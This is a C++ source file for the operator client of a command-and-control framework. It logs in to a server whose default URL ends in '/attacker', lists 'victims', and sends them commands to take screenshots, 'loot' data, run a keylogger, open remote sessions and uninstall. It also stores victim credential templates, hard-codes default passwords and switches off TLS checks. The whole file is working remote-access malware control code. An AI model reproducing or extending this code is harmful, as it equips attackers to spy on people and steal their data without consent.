#include "Client.hpp"
#include "Builder.hpp"
#include "CommandManager.hpp"
#include "Config.hpp"
#include "HttpUtils.hpp"
#include "LogDAO.hpp"
#include "LogManager.hpp"
#include "RESTClient.hpp"
#include "SessionManager.hpp"
#include "Types.hpp"
#include "VictimManager.hpp"
#include "VictimTemplateDAO.hpp"
#include <print>
#include <stdexcept>

//-------------------------------------------------
//
//-------------------------------------------------
Client::Client(const std::string& db_path) :
    m_config( Config::instance(db_path)),
    m_builder( Builder::instance() ),
    m_log_man( LogManager::instance() ),
    m_cmd_man( CommandManager::instance() ),
    m_vic_man( VictimManager::instance() ),
    m_sess_man( SessionManager::instance() ),
    m_rest_client(""),
    m_status_text(""),
    m_last_id( 0 )
{

}

//-------------------------------------------------
//
//-------------------------------------------------
Client& Client::instance(const std::string& db_path) {
    static Client inst(db_path);
    return inst;
}

//-------------------------------------------------
//
//-------------------------------------------------
bool Client::hasServerSession() const noexcept {
    return m_config.has(Key::client_server_url_key)
        && m_config.has(Key::client_username_key)
        && m_config.has(Key::client_password_key)
        && m_config.has(Key::client_bearer_token_key);
}

//-------------------------------------------------
//
//-------------------------------------------------
std::string Client::getUsername() const noexcept {
    return m_config.get<std::string>(Key::client_username_key, "username");
}

//-------------------------------------------------
//
//-------------------------------------------------
std::string Client::getPassword() const noexcept {
    return m_config.get<std::string>(Key::client_password_key, "P4$$w0rd!");
}

//-------------------------------------------------
//
//-------------------------------------------------
std::string Client::getServerUrl() const noexcept {
    return m_config.get<std::string>(Key::client_server_url_key, "https://erarnitox.de:1337/attacker");
}

//-------------------------------------------------
//
//-------------------------------------------------
std::string Client::getTimeout() const noexcept {
    return m_config.get<std::string>("timeout", "10");
}

//-------------------------------------------------
//
//-------------------------------------------------
void Client::setUsername(const std::string& username) noexcept {
    m_config.set(Key::client_username_key, username);
    updateStatusText();
}

//-------------------------------------------------
//
//-------------------------------------------------
void Client::setPassword(const std::string& password) noexcept {
    m_config.set(Key::client_password_key, password);
}

//-------------------------------------------------
//
//-------------------------------------------------
void Client::setServerUrl(const std::string& server_url) noexcept {
    HttpConfig conf;
    conf.follow_redirects = true;
    conf.max_redirects = 3;
    conf.verbose = true;
    conf.verify_ssl = false;

    if (server_url.ends_with("/")) {
        m_rest_client = cpppwn::RESTClient(server_url.substr(server_url.size() - 2), conf);
    } else {
        m_rest_client = cpppwn::RESTClient(server_url, conf);
    }
    m_config.set(Key::client_server_url_key, server_url);
    updateStatusText();
}

//-------------------------------------------------
//
//-------------------------------------------------
void Client::setOutputPath(const std::string& output_dir) noexcept {
    m_config.set(Key::client_output_dir_key, output_dir);
}

//-------------------------------------------------
//
//-------------------------------------------------
void Client::setTimeout(const std::string& timeout) noexcept {
    m_config.set("timeout", timeout);
}

//-------------------------------------------------
//
//-------------------------------------------------
std::string Client::getOutputPath() const noexcept {
    return m_config.get<std::string>(Key::client_output_dir_key, "./outputs");
}

//-------------------------------------------------
//
//-------------------------------------------------
bool Client::login() noexcept {
    m_rest_client.set_auth_basic(getUsername(), getPassword());

    // make test request
    try{
        return m_rest_client.get<bool>("/auth");
    } catch(const std::runtime_error& err) {
        std::println("Login Failed: {}", err.what());
        return false;
    }
}

//-------------------------------------------------
//
//-------------------------------------------------
const char* Client::getStatusText() const noexcept {
    return m_status_text.c_str();
}

//-------------------------------------------------
//
//-------------------------------------------------
void Client::updateStatusText() noexcept {
    m_status_text = std::format("User: [{}] | C2 Server: [{}] | Connections: [{}]", getUsername(), getServerUrl(), victim_count);
}

//-------------------------------------------------
//
//-------------------------------------------------
bool Client::fetchVictims() noexcept {
    m_rest_client.set_auth_basic(getUsername(), getPassword());

    // make request
    try{
        auto victim_list = m_rest_client.list<Victim>("api/victims");
        victim_count = victim_list.size();
        m_vic_man.setList(std::move(victim_list));
        updateStatusText();
        return true;
    } catch(const std::runtime_error& err) {
        m_log_man.local_log( std::format("Fetching Victims Failed: {}", err.what()));
        return false;
    }
}

//-------------------------------------------------
//
//-------------------------------------------------
bool Client::fetchLogs() noexcept {
    m_rest_client.set_auth_basic(getUsername(), getPassword());

    // make request
    try{
        const auto log_list = m_rest_client.list<LogDAO>("api/logs");
        m_log_man.set_list(log_list);
        return true;
    } catch(const std::runtime_error& err) {
        m_log_man.local_log( std::format("Fetching Logs Failed: {}", err.what()));
        return false;
    }
}

//-------------------------------------------------
//
//-------------------------------------------------
bool Client::sendLogBuffer() {
    m_rest_client.set_auth_basic(getUsername(), getPassword());

    // send logs to logs endpoint
    try {
        bool everything_good = true;
        const auto log_buffer = m_log_man.refresh_send_buffer();
        for(const auto& log_dao : log_buffer) {
            const auto new_log = m_rest_client.post<LogDAO>("api/logs", log_dao);
            if(new_log.id < 0) {
                everything_good = false;
            }
        }

        return everything_good;
    } catch(const std::runtime_error& err) {
        m_log_man.local_log( std::format("Sending Logs Failed: {}", err.what()));
        return false;
    }
}

//-------------------------------------------------
//
//-------------------------------------------------
const std::vector<Victim>& Client::getVictims() const noexcept {
    const auto& vics = m_vic_man.getVictims();
    victim_count = vics.size();
    return vics;
}

//-------------------------------------------------
//
//-------------------------------------------------
[[nodiscard]] bool Client::sendTimeoutCommand(const UUID& client_id, int timeout) {
    m_rest_client.set_auth_basic(getUsername(), getPassword());

    // send command to commands endpoint
    try{
        CommandDAO timeout_command;
        timeout_command.command = std::format("timeout {}", timeout);
        timeout_command.client = client_id;
        timeout_command.uid = generate_uuid();
        timeout_command.nonce = generate_nonce();
        timeout_command.prev = m_last_id;

        ++m_last_id;

        const auto& cmd = m_rest_client.post<CommandDAO>("api/commands", timeout_command);

        return cmd.id > 0;
    } catch(const std::runtime_error& err) {
        m_log_man.local_log( std::format("Sending Timeout Failed: {}", err.what()));
        return false;
    }
}

//-------------------------------------------------
//
//-------------------------------------------------
[[nodiscard]] bool Client::registerTemplate(const std::string& username, const std::string& password) {
    m_rest_client.set_auth_basic(getUsername(), getPassword());

    try{
        VictimTemplateDAO vic_temp;
        vic_temp.username = username;
        vic_temp.password = password;

        const auto& temp = m_rest_client.post<VictimTemplateDAO>("api/templates", vic_temp);

        return temp.id > 0;
    } catch(const std::runtime_error& err) {
        m_log_man.local_log( std::format("Registering Template Failed: {}", err.what()));
        return false;
    }
}

//-------------------------------------------------
//
//-------------------------------------------------
[[nodiscard]] bool Client::sendOpenSessionCommand(const UUID& client_id, int64_t port) {
    m_rest_client.set_auth_basic(getUsername(), getPassword());

    // send command to commands endpoint
    try{
        CommandDAO cmd;
        cmd.command = std::format("session {}", port);
        cmd.client = client_id;
        cmd.uid = generate_uuid();
        cmd.nonce = generate_nonce();
        cmd.prev = m_last_id;

        ++m_last_id;

        const auto& res = m_rest_client.post<CommandDAO>("api/commands", cmd);

        return res.id > 0;
    } catch(const std::runtime_error& err) {
        m_log_man.local_log( std::format("Sending Open Session Command Failed: {}", err.what()));
        return false;
    }
}

//-------------------------------------------------
//
//-------------------------------------------------
[[nodiscard]] bool Client::sendCloseSessionCommand(const UUID& client_id) {
    m_rest_client.set_auth_basic(getUsername(), getPassword());

    // send command to commands endpoint
    try{
        CommandDAO cmd;
        cmd.command = "close";
        cmd.client = client_id;
        cmd.uid = generate_uuid();
        cmd.nonce = generate_nonce();
        cmd.prev = m_last_id;

        ++m_last_id;

        const auto& res = m_rest_client.post<CommandDAO>("api/commands", cmd);

        return res.id > 0;
    } catch(const std::runtime_error& err) {
        m_log_man.local_log( std::format("Sending Open Session Command Failed: {}", err.what()));
        return false;
    }
}

//-------------------------------------------------
//
//-------------------------------------------------
[[nodiscard]] bool Client::sendScreenshotCommand(const UUID& client_id) {
     m_rest_client.set_auth_basic(getUsername(), getPassword());

    // send command to commands endpoint
    try{
        CommandDAO cmd;
        cmd.command = "screenshot";
        cmd.client = client_id;
        cmd.uid = generate_uuid();
        cmd.nonce = generate_nonce();
        cmd.prev = m_last_id;

        ++m_last_id;

        const auto& res = m_rest_client.post<CommandDAO>("api/commands", cmd);

        return res.id > 0;
    } catch(const std::runtime_error& err) {
        m_log_man.local_log( std::format("Sending Open Session Command Failed: {}", err.what()));
        return false;
    }
}

//-------------------------------------------------
//
//-------------------------------------------------
[[nodiscard]] bool Client::sendLootCommand(const UUID& client_id) {
     m_rest_client.set_auth_basic(getUsername(), getPassword());

    // send command to commands endpoint
    try{
        CommandDAO cmd;
        cmd.command = "loot";
        cmd.client = client_id;
        cmd.uid = generate_uuid();
        cmd.nonce = generate_nonce();
        cmd.prev = m_last_id;

        ++m_last_id;

        const auto& res = m_rest_client.post<CommandDAO>("api/commands", cmd);

        return res.id > 0;
    } catch(const std::runtime_error& err) {
        m_log_man.local_log( std::format("Sending Open Session Command Failed: {}", err.what()));
        return false;
    }
}

//-------------------------------------------------
//
//-------------------------------------------------
[[nodiscard]] bool Client::sendStartKeyloggerCommand(const UUID& client_id) {
    m_rest_client.set_auth_basic(getUsername(), getPassword());

    // send command to commands endpoint
    try{
        CommandDAO cmd;
        cmd.command = "keylogger_start";
        cmd.client = client_id;
        cmd.uid = generate_uuid();
        cmd.nonce = generate_nonce();
        cmd.prev = m_last_id;

        ++m_last_id;

        const auto& res = m_rest_client.post<CommandDAO>("api/commands", cmd);

        return res.id > 0;
    } catch(const std::runtime_error& err) {
        m_log_man.local_log( std::format("Sending Open Session Command Failed: {}", err.what()));
        return false;
    }
}

//-------------------------------------------------
//
//-------------------------------------------------
[[nodiscard]] bool Client::sendStopKeyloggerCommand(const UUID& client_id) {
    m_rest_client.set_auth_basic(getUsername(), getPassword());

    // send command to commands endpoint
    try{
        CommandDAO cmd;
        cmd.command = "keylogger_stop";
        cmd.client = client_id;
        cmd.uid = generate_uuid();
        cmd.nonce = generate_nonce();
        cmd.prev = m_last_id;

        ++m_last_id;

        const auto& res = m_rest_client.post<CommandDAO>("api/commands", cmd);

        return res.id > 0;
    } catch(const std::runtime_error& err) {
        m_log_man.local_log( std::format("Sending Open Session Command Failed: {}", err.what()));
        return false;
    }
}

//-------------------------------------------------
//
//-------------------------------------------------
[[nodiscard]] bool Client::sendUninstallCommand(const UUID& client_id) {
    m_rest_client.set_auth_basic(getUsername(), getPassword());

    // send command to commands endpoint
    try{
        CommandDAO cmd;
        cmd.command = "uninstall";
        cmd.client = client_id;
        cmd.uid = generate_uuid();
        cmd.nonce = generate_nonce();
        cmd.prev = m_last_id;

        ++m_last_id;

        const auto& res = m_rest_client.post<CommandDAO>("api/commands", cmd);

        return res.id > 0;
    } catch(const std::runtime_error& err) {
        m_log_man.local_log( std::format("Sending Open Session Command Failed: {}", err.what()));
        return false;
    }
}

//-------------------------------------------------
//
//-------------------------------------------------
[[nodiscard]] bool Client::sendTimeoutCommand(int64_t client_id, int timeout) {
    const UUID& victim_uid = m_vic_man.getVictim(client_id).uid;
    return sendTimeoutCommand(victim_uid, timeout);
}

//-------------------------------------------------
//
//-------------------------------------------------
[[nodiscard]] bool Client::sendOpenSessionCommand(int64_t client_id, int64_t port) {
    const UUID& victim_uid = m_vic_man.getVictim(client_id).uid;
    return sendOpenSessionCommand(victim_uid, port);
}

//-------------------------------------------------
//
//-------------------------------------------------
[[nodiscard]] bool Client::sendCloseSessionCommand(int64_t client_id) {
    const UUID& victim_uid = m_vic_man.getVictim(client_id).uid;
    return sendCloseSessionCommand(victim_uid);
}

//-------------------------------------------------
//
//-------------------------------------------------
[[nodiscard]] bool Client::sendScreenshotCommand(int64_t client_id) {
    const UUID& victim_uid = m_vic_man.getVictim(client_id).uid;
    return sendScreenshotCommand(victim_uid);
}

//-------------------------------------------------
//
//-------------------------------------------------
[[nodiscard]] bool Client::sendLootCommand(int64_t client_id) {
    const UUID& victim_uid = m_vic_man.getVictim(client_id).uid;
    return sendLootCommand(victim_uid);
}

//-------------------------------------------------
//
//-------------------------------------------------
[[nodiscard]] bool Client::sendStartKeyloggerCommand(int64_t client_id) {
    const UUID& victim_uid = m_vic_man.getVictim(client_id).uid;
    return sendStartKeyloggerCommand(victim_uid);
}

//-------------------------------------------------
//
//-------------------------------------------------
[[nodiscard]] bool Client::sendStopKeyloggerCommand(int64_t client_id) {
    const UUID& victim_uid = m_vic_man.getVictim(client_id).uid;
    return sendStopKeyloggerCommand(victim_uid);
}

//-------------------------------------------------
//
//-------------------------------------------------
[[nodiscard]] bool Client::sendUninstallCommand(int64_t client_id) {
    const UUID& victim_uid = m_vic_man.getVictim(client_id).uid;
    return sendUninstallCommand(victim_uid);
}